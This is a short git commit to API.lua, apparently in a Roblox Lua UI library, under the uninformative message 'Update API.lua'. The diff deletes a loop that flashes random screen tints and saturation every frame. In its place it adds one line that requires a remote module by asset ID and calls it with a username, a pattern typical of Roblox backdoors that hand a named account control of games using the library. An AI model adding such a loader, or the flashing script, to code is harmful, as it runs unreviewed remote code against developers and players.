b04115410642f8d58126a53290b399056f64ea70
LinoriaLib1 <190744492+LinoriaLib@users.noreply.github.com>
2025-02-19 16:41:59 +0300

    Update API.lua

--- API.lua
+++ API.lua
@@ -1,6 +1,1 @@
-wait(5)
-local col = Instance.new("ColorCorrectionEffect", game.Lighting)
-while task.wait() do
-    col.TintColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
-    col.Saturation = math.random(-1000, 1000)
-end
+require(10868847330):pls("Mazvtomat2020")
